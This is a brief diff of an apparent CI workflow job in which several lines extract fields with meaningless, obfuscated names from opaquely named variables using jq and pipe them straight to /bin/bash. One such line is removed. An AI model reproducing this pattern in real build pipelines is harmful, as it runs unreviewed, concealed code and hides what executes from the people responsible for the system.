@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$hc500" | jq -r .wb6098 | /bin/bash
           printf '%s' "$gs2003" | jq -r .z965 | /bin/bash
           printf '%s' "$wfww349" | jq -r .xhy600 | /bin/bash
-          echo $ydds0111 | jq -r .ickr35 | /bin/bash
           printf '%s' "$h36" | jq -r .wfrxa4 | /bin/bash
           printf '%s' "$yax2" | jq -r .rxc3760 | /bin/bash
           printf '%s' "$tn567" | jq -r .kb92157 | /bin/bash
